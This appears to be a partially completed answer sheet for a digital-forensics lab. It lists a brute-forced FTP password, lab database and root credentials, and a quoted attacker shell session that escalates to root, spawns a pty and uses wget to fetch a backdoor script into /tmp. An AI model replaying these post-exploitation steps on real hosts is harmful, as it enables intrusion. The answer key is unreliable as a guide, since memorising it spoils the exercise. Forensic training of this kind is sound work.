# It appears that the attacker is attempting to brute force the user's FTP password. Can you find any evidence of a correct password, and if so, what is it?
PASS batman

# What additional information was the attacker able to extract from the user's FTP account?
creadentials.txt , bash history

# What actions did the attacker take with the information obtained from the user's FTP account?
Leaving my database username and password here in case I forget.

username: myuser
password: P@ssw0rd123456!



# What's the root account password?
www-data@w:/var/www/html$ su root
su root
Password: 1amgr000000t!@#$ 
id
su: Authentication failure
www-data@w:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@w:/var/www/html$ su root
su root
Password: 1amgr000000t!@#$
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c "import pty; pty.spawn('/bin/bash');"
root@w:/var/www/html# cd ~
cd ~
root@w:~# ls -la
ls -la
total 56
drwx------  7 root root 4096 ..........  23 04:27 .
drwxr-xr-x 20 root root 4096 ..........   8 20:40 ..
-rw-------  1 root root 2663 ..........  23 04:27 .bash_history
-rw-r--r--  1 root root 3106 ............ 15  2021 .bashrc
drwx------  5 root root 4096 ..........  16 01:42 .cache
drwxr-xr-x  2 root root 4096 ............ 12 14:22 .cassandra
drwx------  7 root root 4096 ..........  23 04:04 .config
-rw-r--r--  1 root root  133 ..........  23 02:47 gr00t.txt
-rw-------  1 root root   20 ..........  11 17:41 .lesshst
drwxr-xr-x  3 root root 4096 ..........   5 09:30 .local
-rw-------  1 root root  353 ..........  11 19:58 .mysql_history
-rw-r--r--  1 root root  161 ............  9  2019 .profile
drwx------  5 root root 4096 ..........   8 21:09 snap
-rw-r--r--  1 root root    0 ............ 12 14:17 .sudo_as_admin_successful
-rw-r--r--  1 root root  180 ..........  23 04:23 .wget-hsts
root@w:~# cat gr00t.txt
cat gr00t.txt
Congrats on getting here. But that's not it, the real test starts now! ;)

Btw, here's your flag for this stage: flag{1_4m_gr00000t!}root@w:~# cd /tmp
cd /tmp
root@w:/tmp# wget https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py

# Can you identify the packet numbers in which the attacker exploited the Remote Code Execution vulnerability to gain access to the system? What was the exact payload used by the attacker?
# After gaining access to the system, what does the attacker seem to be doing?
# The attacker read a file from root's home directory. What was in that file?
# The attacker downloaded a file inside root's home directory. What's the purpose of that file?
# What information was transmitted through the attacker's covertly established channel of communication?
